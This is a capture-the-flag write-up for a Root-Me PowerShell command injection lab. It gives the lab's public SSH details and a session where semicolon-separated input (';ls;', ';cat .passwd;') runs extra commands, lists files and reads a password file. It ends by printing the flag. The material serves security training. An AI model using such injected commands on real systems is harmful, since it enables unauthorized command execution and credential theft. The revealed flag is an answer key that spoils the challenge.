# Powershell Command Injection

URL: [https://www.root-me.org/en/Challenges/App-Script/Powershell-Command-Injection](https://www.root-me.org/en/Challenges/App-Script/Powershell-Command-Injection)

## Statement

Recover the database’s password.
## Challenge connection information

| Key        | Value                                                                                                                                                                                                                                                                                                                                 |
| ---------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Host       | challenge05.root-me.org                                                                                                                                                                                                                                                                                                               |
| Protocol   | SSH                                                                                                                                                                                                                                                                                                                                   |
| Port       | 2225                                                                                                                                                                                                                                                                                                                                  |
| SSH access | [ssh -p 2225 app-script-ch18@challenge05.root-me.org](ssh://app-script-ch18:app-script-ch18@challenge05.root-me.org:2225 "SSH access")     [![](https://www.root-me.org/squelettes/img/webssh.png?1454749832) WebSSH](http://webssh.root-me.org/?location=WebSSH_2296&ssh=ssh://app-script-ch18:app-script-ch18@challenge05 "WebSSH") |
| Username   | app-script-ch18                                                                                                                                                                                                                                                                                                                       |
| Password   | app-script-ch18                                                                                                                                                                                                                                                                                                                       |

## Solution

We are able to inject semicolons and then new powershell commands.

```powershell
➜ ssh -p 2225 app-script-ch18@challenge05.root-me.org
Table to dump:
> ls
Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8AEUAdgB0AC8ASgBKAHcAYQBqADUAeAA4AH
QAWABRAEIAWgBjAHIAUAAwAEEAPQA9AHwAYgAxAGYAYwA4ADAAOQA3AGYAZQAxADEAZQA4ADQAYwAxAGQAOABlAGIAYwA3ADAANAAwADMAMABmAGYAMQA4AD
AAMwA1ADIAMAA1ADUANwBlAGYAZgA3AGQAZAA3ADIAZQBhADgAOAA3ADAAMABlADgAMQBiADgAYgAwADIANQBmAGMANwAxAGUANwBiADUAOAA5ADcAMABhAG
MANAAxADgANwBjAGIAZgBhAGYAYwA1ADQAYwAwADAAOABhAGEA. Backup the table ls
Table to dump:
> ;ls;
Connect to the database With the secure Password: 76...EA. Backup the table

    Directory: C:\cygwin64\challenge\app-script\ch18

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       12/12/2021   9:25 AM             43 .git
-a----       11/21/2021  11:34 AM            150 .key
-a----        4/20/2020  10:50 AM             18 .passwd
------       12/12/2021   9:50 AM            574 ._perms
------       11/21/2021  11:35 AM            348 ch18.ps1
Table to dump:
> ;cat .passwd;
Connect to the database With the secure Password: 76...EA. Backup the table
SecureIEXpassword
Table to dump:
> exit
```

::: tip Flag
`SecureIEXpassword`
:::